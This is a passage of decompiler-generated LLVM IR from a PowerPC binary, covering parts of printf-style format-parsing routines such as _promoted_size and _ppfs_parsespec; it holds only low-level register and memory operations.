  store i32 %v3_10008fa4, i32* %r9.global-to-local, align 4
  %v1_10008fa8 = add i32 %v3_10008fa4, 4
  store i32 %v1_10008fa8, i32* %r0.global-to-local, align 4
  store i32 %v1_10008fa8, i32* %v2_10008fa4, align 4
  br label %dec_label_pc_10008fb0

dec_label_pc_10008fb0:                            ; preds = %dec_label_pc_10008f8c, %dec_label_pc_10008fa4
  %v0_10008fb0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008fb0 = inttoptr i32 %v0_10008fb0 to i32*
  %v2_10008fb0 = load i32, i32* %v1_10008fb0, align 4
  store i32 %v2_10008fb0, i32* %r0.global-to-local, align 4
  %v1_10008fb4 = load i32, i32* @r8, align 4
  %v2_10008fb4 = inttoptr i32 %v1_10008fb4 to i32*
  store i32 %v2_10008fb0, i32* %v2_10008fb4, align 4
  %v0_10008fb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008fb8 = load i32, i32* @r3, align 4
  %v2_10008fb8 = add i32 %v1_10008fb8, 4
  %v3_10008fb8 = inttoptr i32 %v2_10008fb8 to i32*
  store i32 %v0_10008fb8, i32* %v3_10008fb8, align 4
  %v0_100090fc5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100090fc.preheader

dec_label_pc_100090fc.preheader:                  ; preds = %dec_label_pc_10008f6c, %dec_label_pc_10008fb0
  %v0_100090fc5 = phi i32 [ %v2_10008f9c, %dec_label_pc_10008f6c ], [ %v0_100090fc5.pre, %dec_label_pc_10008fb0 ]
  store i32 0, i32* @r7, align 4
  %v1_100090fc6 = add i32 %v0_100090fc5, 28
  %v2_100090fc7 = inttoptr i32 %v1_100090fc6 to i32*
  %v3_100090fc8 = load i32, i32* %v2_100090fc7, align 4
  store i32 %v3_100090fc8, i32* %r0.global-to-local, align 4
  %v2_100091009 = icmp sgt i32 %v3_100090fc8, 0
  %v3_1000910010 = icmp slt i32 %v3_100090fc8, 0
  store i1 %v3_1000910010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100091009, label %dec_label_pc_10008fc4, label %dec_label_pc_1000914c

dec_label_pc_10008fc4:                            ; preds = %dec_label_pc_100090fc.preheader, %dec_label_pc_100090f8
  %v2_100090d8 = phi i32 [ %v0_100090fc, %dec_label_pc_100090f8 ], [ %v0_100090fc5, %dec_label_pc_100090fc.preheader ]
  %v0_10008fc4 = phi i32 [ %v1_100090f8, %dec_label_pc_100090f8 ], [ 0, %dec_label_pc_100090fc.preheader ]
  %v1_10008fc4 = mul i32 %v0_10008fc4, 4
  %v2_10008fc8 = add i32 %v1_10008fc4, %v2_100090d8
  store i32 %v2_10008fc8, i32* %r9.global-to-local, align 4
  %v1_10008fcc = add i32 %v2_10008fc8, 40
  %v2_10008fcc = inttoptr i32 %v1_10008fcc to i32*
  %v3_10008fcc = load i32, i32* %v2_10008fcc, align 4
  store i32 %v3_10008fcc, i32* %r0.global-to-local, align 4
  %v2_10008fd0 = icmp sgt i32 %v3_10008fcc, 8
  %v3_10008fd0 = icmp eq i32 %v3_10008fcc, 8
  store i1 %v2_10008fd0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008fd0, label %dec_label_pc_100090f8, label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fc4
  %v1_10008fd8 = add i32 %v2_100090d8, 76
  store i32 %v1_10008fd8, i32* %r10.global-to-local, align 4
  br i1 %v2_10008fd0, label %dec_label_pc_10008ff4, label %dec_label_pc_10008fe0

dec_label_pc_10008fe0:                            ; preds = %dec_label_pc_10008fd8
  %v2_10008fe0 = icmp sgt i32 %v3_10008fcc, 2
  store i1 %v2_10008fe0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_10008fcc, 3
  br i1 %tmp23, label %dec_label_pc_100090bc, label %dec_label_pc_1000900c

dec_label_pc_10008ff4:                            ; preds = %dec_label_pc_10008fd8
  %v2_10008ff4 = icmp sgt i32 %v3_10008fcc, 1024
  store i1 %v2_10008ff4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_10008fcc, 1025
  br i1 %tmp24, label %dec_label_pc_100090bc, label %dec_label_pc_10009000

dec_label_pc_10009000:                            ; preds = %dec_label_pc_10008ff4
  %v2_10009000 = icmp sgt i32 %v3_10008fcc, 2048
  %v3_10009000 = icmp eq i32 %v3_10008fcc, 2048
  store i1 %v2_10009000, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10009000, label %dec_label_pc_10009014, label %dec_label_pc_10009008

dec_label_pc_10009008:                            ; preds = %dec_label_pc_10009000
  %v2_10009008 = icmp sgt i32 %v3_10008fcc, 2055
  %v3_10009008 = icmp eq i32 %v3_10008fcc, 2055
  store i1 %v2_10009008, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10009008, label %dec_label_pc_10009070, label %dec_label_pc_100090bc

dec_label_pc_1000900c:                            ; preds = %dec_label_pc_10008fe0
  %v3_10008fec = icmp eq i32 %v3_10008fcc, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008fec, label %dec_label_pc_10009070, label %dec_label_pc_100090bc

dec_label_pc_10009014:                            ; preds = %dec_label_pc_10009000
  %v2_10009014 = inttoptr i32 %v1_10008fd8 to i8*
  %v3_10009014 = load i8, i8* %v2_10009014, align 1
  %v4_10009014 = zext i8 %v3_10009014 to i32
  %v2_10009018 = icmp ugt i8 %v3_10009014, 6
  store i1 %v2_10009018, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_10009014, 2
  %v1_1000901c = zext i8 %tmp28 to i32
  store i32 %v1_1000901c, i32* %r9.global-to-local, align 4
  %v2_10009020 = add nuw nsw i32 %v1_1000901c, %v4_10009014
  store i32 %v2_10009020, i32* %r0.global-to-local, align 4
  %v1_10009024 = trunc i32 %v2_10009020 to i8
  store i8 %v1_10009024, i8* %v2_10009014, align 1
  %v0_10009028 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10009028, label %dec_label_pc_10009048, label %dec_label_pc_1000902c

dec_label_pc_1000902c:                            ; preds = %dec_label_pc_10009014
  %v0_1000902c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000902c = urem i32 %v0_1000902c, 256
  store i32 %v1_1000902c, i32* %r9.global-to-local, align 4
  %v0_10009030 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009030 = add i32 %v0_10009030, 8
  %v2_10009030 = inttoptr i32 %v1_10009030 to i32*
  %v3_10009030 = load i32, i32* %v2_10009030, align 4
  %v1_10009034 = mul nuw nsw i32 %v1_1000902c, 4
  store i32 %v1_10009034, i32* %r0.global-to-local, align 4
  %v1_10009038 = add nuw nsw i32 %v1_1000902c, 2
  store i32 %v1_10009038, i32* %r9.global-to-local, align 4
  %v2_1000903c = add i32 %v3_10009030, %v1_10009034
  store i32 %v2_1000903c, i32* %r11.global-to-local, align 4
  %v1_10009040 = trunc i32 %v1_10009038 to i8
  %v2_10009040 = load i32, i32* @r3, align 4
  %v3_10009040 = add i32 %v2_10009040, 76
  %v4_10009040 = inttoptr i32 %v3_10009040 to i8*
  store i8 %v1_10009040, i8* %v4_10009040, align 1
  br label %dec_label_pc_1000905c

dec_label_pc_10009048:                            ; preds = %dec_label_pc_10009014
  %v0_10009048 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009048 = add i32 %v0_10009048, 4
  %v2_10009048 = inttoptr i32 %v1_10009048 to i32*
  %v3_10009048 = load i32, i32* %v2_10009048, align 4
  %v1_1000904c = add i32 %v3_10009048, 7
  store i32 %v1_1000904c, i32* %r9.global-to-local, align 4
  %v1_10009050 = call i32 @__asm_rlwinm(i32 %v1_1000904c, i32 0, i32 0, i32 28)
  store i32 %v1_10009050, i32* %r11.global-to-local, align 4
  %v1_10009054 = add i32 %v1_10009050, 8
  store i32 %v1_10009054, i32* %r0.global-to-local, align 4
  %v1_10009058 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009058 = add i32 %v1_10009058, 4
  %v3_10009058 = inttoptr i32 %v2_10009058 to i32*
  store i32 %v1_10009054, i32* %v3_10009058, align 4
  br label %dec_label_pc_1000905c

dec_label_pc_1000905c:                            ; preds = %dec_label_pc_1000902c, %dec_label_pc_10009048
  %v0_1000905c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000905c = inttoptr i32 %v0_1000905c to i32*
  %v2_1000905c = load i32, i32* %v1_1000905c, align 4
  store i32 %v2_1000905c, i32* %r9.global-to-local, align 4
  %v1_10009060 = add i32 %v0_1000905c, 4
  %v2_10009060 = inttoptr i32 %v1_10009060 to i32*
  %v3_10009060 = load i32, i32* %v2_10009060, align 4
  store i32 %v3_10009060, i32* %r10.global-to-local, align 4
  %v1_10009064 = load i32, i32* @r8, align 4
  %v2_10009064 = inttoptr i32 %v1_10009064 to i32*
  store i32 %v2_1000905c, i32* %v2_10009064, align 4
  %v0_10009068 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009068 = load i32, i32* @r8, align 4
  %v2_10009068 = add i32 %v1_10009068, 4
  %v3_10009068 = inttoptr i32 %v2_10009068 to i32*
  store i32 %v0_10009068, i32* %v3_10009068, align 4
  br label %dec_label_pc_100090f4

dec_label_pc_10009070:                            ; preds = %dec_label_pc_10009008, %dec_label_pc_1000900c
  store i32 %v1_10008fd8, i32* %r10.global-to-local, align 4
  %v1_10009074 = add i32 %v2_100090d8, 77
  %v2_10009074 = inttoptr i32 %v1_10009074 to i8*
  %v3_10009074 = load i8, i8* %v2_10009074, align 1
  %v4_10009074 = zext i8 %v3_10009074 to i32
  store i32 %v4_10009074, i32* %r11.global-to-local, align 4
  %v2_10009078 = icmp ugt i8 %v3_10009074, 8
  store i1 %v2_10009078, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_10009074, 7
  br i1 %tmp25, label %dec_label_pc_1000909c, label %dec_label_pc_10009080

dec_label_pc_10009080:                            ; preds = %dec_label_pc_10009070
  %v1_10009080 = add i32 %v2_100090d8, 84
  %v2_10009080 = inttoptr i32 %v1_10009080 to i32*
  %v3_10009080 = load i32, i32* %v2_10009080, align 4
  %v1_10009084 = mul nuw nsw i32 %v4_10009074, 8
  %v1_10009088 = add nuw nsw i32 %v1_10009084, 32
  %v2_1000908c = add i32 %v1_10009088, %v3_10009080
  store i32 %v2_1000908c, i32* %r9.global-to-local, align 4
  %v1_10009090 = add nuw nsw i32 %v4_10009074, 1
  store i32 %v1_10009090, i32* %r0.global-to-local, align 4
  %v1_10009094 = trunc i32 %v1_10009090 to i8
  store i8 %v1_10009094, i8* %v2_10009074, align 1
  br label %dec_label_pc_100090f4

dec_label_pc_1000909c:                            ; preds = %dec_label_pc_10009070
  %v1_1000909c = add i32 %v2_100090d8, 80
  %v2_1000909c = inttoptr i32 %v1_1000909c to i32*
  %v3_1000909c = load i32, i32* %v2_1000909c, align 4
  %v1_100090a0 = add i32 %v3_1000909c, 7
  store i32 %v1_100090a0, i32* %r9.global-to-local, align 4
  %v1_100090a4 = call i32 @__asm_rlwinm(i32 %v1_100090a0, i32 0, i32 0, i32 28)
  store i32 %v1_100090a4, i32* %r9.global-to-local, align 4
  %v1_100090a8 = add i32 %v1_100090a4, 8
  store i32 %v1_100090a8, i32* %r0.global-to-local, align 4
  %v1_100090ac = load i32, i32* %r10.global-to-local, align 4
  %v2_100090ac = add i32 %v1_100090ac, 4
  %v3_100090ac = inttoptr i32 %v2_100090ac to i32*
  store i32 %v1_100090a8, i32* %v3_100090ac, align 4
  br label %dec_label_pc_100090f4

dec_label_pc_100090bc:                            ; preds = %dec_label_pc_10009008, %dec_label_pc_1000900c, %dec_label_pc_10008ff4, %dec_label_pc_10008fe0
  %v2_100090bc = inttoptr i32 %v1_10008fd8 to i8*
  %v3_100090bc = load i8, i8* %v2_100090bc, align 1
  %v4_100090bc = zext i8 %v3_100090bc to i32
  store i32 %v4_100090bc, i32* %r11.global-to-local, align 4
  %v2_100090c0 = icmp ugt i8 %v3_100090bc, 8
  store i1 %v2_100090c0, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_100090bc, 7
  br i1 %tmp26, label %dec_label_pc_100090e0, label %dec_label_pc_100090c8

dec_label_pc_100090c8:                            ; preds = %dec_label_pc_100090bc
  %v1_100090c8 = add i32 %v2_100090d8, 84
  %v2_100090c8 = inttoptr i32 %v1_100090c8 to i32*
  %v3_100090c8 = load i32, i32* %v2_100090c8, align 4
  %v1_100090cc = mul nuw nsw i32 %v4_100090bc, 4
  %v2_100090d0 = add i32 %v3_100090c8, %v1_100090cc
  store i32 %v2_100090d0, i32* %r9.global-to-local, align 4
  %v1_100090d4 = add nuw nsw i32 %v4_100090bc, 1
  store i32 %v1_100090d4, i32* %r0.global-to-local, align 4
  %v1_100090d8 = trunc i32 %v1_100090d4 to i8
  store i8 %v1_100090d8, i8* %v2_100090bc, align 1
  br label %dec_label_pc_100090ec

dec_label_pc_100090e0:                            ; preds = %dec_label_pc_100090bc
  %v1_100090e0 = add i32 %v2_100090d8, 80
  %v2_100090e0 = inttoptr i32 %v1_100090e0 to i32*
  %v3_100090e0 = load i32, i32* %v2_100090e0, align 4
  store i32 %v3_100090e0, i32* %r9.global-to-local, align 4
  %v1_100090e4 = add i32 %v3_100090e0, 4
  store i32 %v1_100090e4, i32* %r0.global-to-local, align 4
  store i32 %v1_100090e4, i32* %v2_100090e0, align 4
  br label %dec_label_pc_100090ec

dec_label_pc_100090ec:                            ; preds = %dec_label_pc_100090c8, %dec_label_pc_100090e0
  %v0_100090ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100090ec = inttoptr i32 %v0_100090ec to i32*
  %v2_100090ec = load i32, i32* %v1_100090ec, align 4
  store i32 %v2_100090ec, i32* %r0.global-to-local, align 4
  %v1_100090f0 = load i32, i32* @r8, align 4
  %v2_100090f0 = inttoptr i32 %v1_100090f0 to i32*
  store i32 %v2_100090ec, i32* %v2_100090f0, align 4
  br label %dec_label_pc_100090f4

dec_label_pc_100090f4:                            ; preds = %dec_label_pc_1000909c, %dec_label_pc_10009080, %dec_label_pc_1000905c, %dec_label_pc_100090ec
  %v0_100090f4 = load i32, i32* @r8, align 4
  %v1_100090f4 = add i32 %v0_100090f4, 8
  store i32 %v1_100090f4, i32* @r8, align 4
  %v0_100090f8.pre = load i32, i32* @r7, align 4
  %v0_100090fc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100090f8

dec_label_pc_100090f8:                            ; preds = %dec_label_pc_10008fc4, %dec_label_pc_100090f4
  %v0_100090fc = phi i32 [ %v2_100090d8, %dec_label_pc_10008fc4 ], [ %v0_100090fc.pre, %dec_label_pc_100090f4 ]
  %v0_100090f8 = phi i32 [ %v0_10008fc4, %dec_label_pc_10008fc4 ], [ %v0_100090f8.pre, %dec_label_pc_100090f4 ]
  %v1_100090f8 = add i32 %v0_100090f8, 1
  store i32 %v1_100090f8, i32* @r7, align 4
  %v1_100090fc = add i32 %v0_100090fc, 28
  %v2_100090fc = inttoptr i32 %v1_100090fc to i32*
  %v3_100090fc = load i32, i32* %v2_100090fc, align 4
  store i32 %v3_100090fc, i32* %r0.global-to-local, align 4
  %v2_10009100 = icmp slt i32 %v1_100090f8, %v3_100090fc
  %v3_10009100 = icmp sgt i32 %v1_100090f8, %v3_100090fc
  store i1 %v3_10009100, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_10009100, label %dec_label_pc_10008fc4, label %dec_label_pc_1000914c

dec_label_pc_1000910c:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_10009110 = icmp ne i32 %v3_10008f14, -2147483648
  %v4_10009110 = icmp eq i32 %v3_10008f14, -2147483648
  store i1 %v3_10009110, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10009110, label %dec_label_pc_10009118, label %dec_label_pc_1000912c

dec_label_pc_10009118:                            ; preds = %dec_label_pc_1000910c
  %v1_10009118 = add i32 %v0_10008f0c, 36
  %v2_10009118 = inttoptr i32 %v1_10009118 to i8*
  %v3_10009118 = load i8, i8* %v2_10009118, align 1
  %v4_10009118 = zext i8 %v3_10009118 to i32
  %v1_1000911c = mul nuw nsw i32 %v4_10009118, 8
  %v2_10009120 = add i32 %v1_1000911c, %v1_10008f10
  store i32 %v2_10009120, i32* %r9.global-to-local, align 4
  %v1_10009124 = add i32 %v2_10009120, -8
  %v2_10009124 = inttoptr i32 %v1_10009124 to i32*
  %v3_10009124 = load i32, i32* %v2_10009124, align 4
  store i32 %v3_10009124, i32* %r0.global-to-local, align 4
  store i32 %v3_10009124, i32* %v2_10008f14, align 4
  %v0_1000912c.pre = load i32, i32* @r3, align 4
  %v1_10009130.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000912c

dec_label_pc_1000912c:                            ; preds = %dec_label_pc_1000910c, %dec_label_pc_10009118
  %v1_10009130 = phi i32 [ -2147483648, %dec_label_pc_1000910c ], [ %v1_10009130.pre, %dec_label_pc_10009118 ]
  %v1_10009148 = phi i32 [ %v0_10008f0c, %dec_label_pc_1000910c ], [ %v0_1000912c.pre, %dec_label_pc_10009118 ]
  %v1_1000912c = add i32 %v1_10009148, 4
  %v2_1000912c = inttoptr i32 %v1_1000912c to i32*
  %v3_1000912c = load i32, i32* %v2_1000912c, align 4
  store i32 %v3_1000912c, i32* %r0.global-to-local, align 4
  %v3_10009130 = icmp sgt i32 %v3_1000912c, %v1_10009130
  %v4_10009130 = icmp eq i32 %v3_1000912c, %v1_10009130
  store i1 %v3_10009130, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10009130, label %dec_label_pc_10009138, label %dec_label_pc_1000914c

dec_label_pc_10009138:                            ; preds = %dec_label_pc_1000912c
  %v1_10009138 = add i32 %v1_10009148, 37
  %v2_10009138 = inttoptr i32 %v1_10009138 to i8*
  %v3_10009138 = load i8, i8* %v2_10009138, align 1
  %v4_10009138 = zext i8 %v3_10009138 to i32
  %v1_1000913c = mul nuw nsw i32 %v4_10009138, 8
  %v1_10009140 = load i32, i32* @r8, align 4
  %v2_10009140 = add i32 %v1_1000913c, %v1_10009140
  store i32 %v2_10009140, i32* %r9.global-to-local, align 4
  %v1_10009144 = add i32 %v2_10009140, -8
  %v2_10009144 = inttoptr i32 %v1_10009144 to i32*
  %v3_10009144 = load i32, i32* %v2_10009144, align 4
  store i32 %v3_10009144, i32* %r0.global-to-local, align 4
  store i32 %v3_10009144, i32* %v2_1000912c, align 4
  %v0_1000914c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000914c

dec_label_pc_1000914c:                            ; preds = %dec_label_pc_100090f8, %dec_label_pc_100090fc.preheader, %dec_label_pc_1000912c, %dec_label_pc_10009138
  %v0_1000914c = phi i32 [ %v1_10009148, %dec_label_pc_1000912c ], [ %v0_1000914c.pre, %dec_label_pc_10009138 ], [ %v0_100090fc5, %dec_label_pc_100090fc.preheader ], [ %v0_100090fc, %dec_label_pc_100090f8 ]
  %v1_1000914c = add i32 %v0_1000914c, 8
  %v2_1000914c = inttoptr i32 %v1_1000914c to i32*
  %v3_1000914c = load i32, i32* %v2_1000914c, align 4
  store i32 %v3_1000914c, i32* %r11.global-to-local, align 4
  %v2_10009150 = icmp sgt i32 %v3_1000914c, 0
  store i1 %v2_10009150, i1* %cr7_gt.global-to-local, align 1
  %v0_10009154 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000914c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_10009154)
  %v0_10009158 = load i32, i32* @r3, align 4
  %v1_10009158 = add i32 %v0_10009158, 16
  %v2_10009158 = inttoptr i32 %v1_10009158 to i32*
  %v3_10009158 = load i32, i32* %v2_10009158, align 4
  store i32 %v3_10009158, i32* %r0.global-to-local, align 4
  %v0_1000915c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000915c = sub i32 0, %v0_1000915c
  store i32 %v1_1000915c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10009164 = add i32 %v0_10009158, 8
  %v3_10009164 = inttoptr i32 %v2_10009164 to i32*
  store i32 %v1_1000915c, i32* %v3_10009164, align 4
  %v0_10009168 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009168 = or i32 %v0_10009168, 8
  store i32 %v1_10009168, i32* %r0.global-to-local, align 4
  %v0_1000916c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000916c = load i32, i32* @r3, align 4
  %v2_1000916c = add i32 %v1_1000916c, 20
  %v3_1000916c = inttoptr i32 %v2_1000916c to i32*
  store i32 %v0_1000916c, i32* %v3_1000916c, align 4
  %v1_10009170 = call i32 @__asm_rlwinm(i32 %v1_10009168, i32 0, i32 0, i32 30)
  store i32 %v1_10009170, i32* %r0.global-to-local, align 4
  %v1_10009174 = load i32, i32* @r3, align 4
  %v2_10009174 = add i32 %v1_10009174, 16
  %v3_10009174 = inttoptr i32 %v2_10009174 to i32*
  store i32 %v1_10009170, i32* %v3_10009174, align 4
  %v0_10009178 = load i32, i32* @r3, align 4
  ret i32 %v0_10009178

; uselistorder directives
  uselistorder i32 %v3_1000912c, { 1, 0, 2 }
  uselistorder i32 %v1_10009130, { 1, 0 }
  uselistorder i32 %v3_100090fc, { 1, 0, 2 }
  uselistorder i32 %v1_100090f8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100090fc, { 0, 2, 1 }
  uselistorder i32 %v4_10009074, { 1, 0, 2 }
  uselistorder i32 %v1_10009034, { 1, 0 }
  uselistorder i32 %v1_1000902c, { 2, 0, 1 }
  uselistorder i32 %v1_10008fd8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10008fcc, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10008fc4, { 1, 0 }
  uselistorder i32 %v2_100090d8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100090fc5, { 1, 0, 2 }
  uselistorder i32 %v3_10008f6c, { 1, 0, 2 }
  uselistorder i32 %v2_10008f9c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10008f14, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10008f0c, { 1, 0, 2 }
  uselistorder i32 %v0_10008f0c, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 19, 18, 8, 9, 10, 11, 0, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_1000914c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000912c, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8, { 1, 0 }
  uselistorder label %dec_label_pc_100090f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100090ec, { 1, 0 }
  uselistorder label %dec_label_pc_100090bc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10009070, { 1, 0 }
  uselistorder label %dec_label_pc_1000905c, { 1, 0 }
  uselistorder label %dec_label_pc_10008fc4, { 1, 0 }
  uselistorder label %dec_label_pc_100090fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008fb0, { 1, 0 }
  uselistorder label %dec_label_pc_10008f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10008f60, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_10009188

dec_label_pc_10009188:                            ; preds = %dec_label_pc_10009188, %entry
  %v0_10009188 = phi i32 [ ptrtoint (i32* @global_var_1001297c.581 to i32), %entry ], [ %v1_10009188, %dec_label_pc_10009188 ]
  %v1_10009188 = add i32 %v0_10009188, -2
  %v2_10009188 = inttoptr i32 %v1_10009188 to i16*
  %v3_10009188 = load i16, i16* %v2_10009188, align 2
  %v4_10009188 = sext i16 %v3_10009188 to i32
  %v4_1000918c = icmp eq i32 %v4_10009188, %arg1
  %v3_10009190.not = icmp ule i32 %v1_10009188, ptrtoint (i32* @global_var_10012964.582 to i32)
  %brmerge = or i1 %v4_1000918c, %v3_10009190.not
  br i1 %brmerge, label %dec_label_pc_1000919c, label %dec_label_pc_10009188

dec_label_pc_1000919c:                            ; preds = %dec_label_pc_10009188
  %v2_100091a4 = sub i32 %v1_10009188, ptrtoint (i32* @global_var_10012964.582 to i32)
  %v1_100091ac = udiv i32 %v2_100091a4, 2
  %v2_100091ac = and i32 %v2_100091a4, -2147483648
  %v3_100091ac = or i32 %v1_100091ac, %v2_100091ac
  %v2_100091b4 = add i32 %v3_100091ac, ptrtoint (i32* @global_var_1001297c.581 to i32)
  %v3_100091b4 = inttoptr i32 %v2_100091b4 to i8*
  %v4_100091b4 = load i8, i8* %v3_100091b4, align 1
  %v5_100091b4 = zext i8 %v4_100091b4 to i32
  ret i32 %v5_100091b4

; uselistorder directives
  uselistorder i32 %v2_100091a4, { 1, 0 }
  uselistorder i32 %v1_10009188, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10012964.582 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001297c.581 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100091bc = load i32, i32* @lr, align 4
  store i32 %v0_100091bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_100091d4 = add i32 %tmp, 16
  %v2_100091d4 = inttoptr i32 %v1_100091d4 to i32*
  %v3_100091d4 = load i32, i32* %v2_100091d4, align 4
  %v1_100091dc = and i32 %v3_100091d4, 128
  store i32 %v1_100091dc, i32* %r6.global-to-local, align 4
  %v3_100091dc = icmp eq i32 %v1_100091dc, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100091f0 = add i32 %tmp, 24
  %v2_100091f0 = inttoptr i32 %v1_100091f0 to i32*
  %v3_100091f0 = load i32, i32* %v2_100091f0, align 4
  store i32 %v3_100091f0, i32* @r26, align 4
  br i1 %v3_100091dc, label %dec_label_pc_100091f8, label %dec_label_pc_10009210

dec_label_pc_100091f8:                            ; preds = %entry
  %v2_100091f8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10009264

dec_label_pc_10009208:                            ; preds = %dec_label_pc_10009438
  %v1_10009208 = add i32 %v0_10009408, 1
  store i32 %v1_10009208, i32* @r30, align 4
  br label %dec_label_pc_10009450

dec_label_pc_10009210:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_10009214 = load i32, i32* %arg1, align 4
  store i32 %v2_10009214, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10009220 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10009220, i32* @r7, align 4
  br label %dec_label_pc_10009224

dec_label_pc_10009224:                            ; preds = %dec_label_pc_10009254.dec_label_pc_10009224_crit_edge, %dec_label_pc_10009210
  %v0_1000922c = phi i32 [ %v0_1000922c.pre, %dec_label_pc_10009254.dec_label_pc_10009224_crit_edge ], [ %v2_10009214, %dec_label_pc_10009210 ]
  %v0_10009228 = phi i32 [ %v0_10009228.pre, %dec_label_pc_10009254.dec_label_pc_10009224_crit_edge ], [ %v2_10009220, %dec_label_pc_10009210 ]
  %v0_10009230 = phi i32 [ %v0_10009224.pre, %dec_label_pc_10009254.dec_label_pc_10009224_crit_edge ], [ 0, %dec_label_pc_10009210 ]
  %v1_10009224 = mul i32 %v0_10009230, 4
  %v2_10009228 = add i32 %v0_10009230, %v0_10009228
  store i32 %v2_10009228, i32* %r9.global-to-local, align 4
  %v2_1000922c = add i32 %v1_10009224, %v0_1000922c
  store i32 %v2_1000922c, i32* %r11.global-to-local, align 4
  %v1_10009230 = add i32 %v0_10009230, 1
  store i32 %v1_10009230, i32* %r10.global-to-local, align 4
  %v1_10009234 = add i32 %v2_1000922c, -4
  %v2_10009234 = inttoptr i32 %v1_10009234 to i32*
  %v3_10009234 = load i32, i32* %v2_10009234, align 4
  store i32 %v3_10009234, i32* %r0.global-to-local, align 4
  %v1_10009238 = trunc i32 %v3_10009234 to i8
  %v3_10009238 = add i32 %v2_10009228, 24
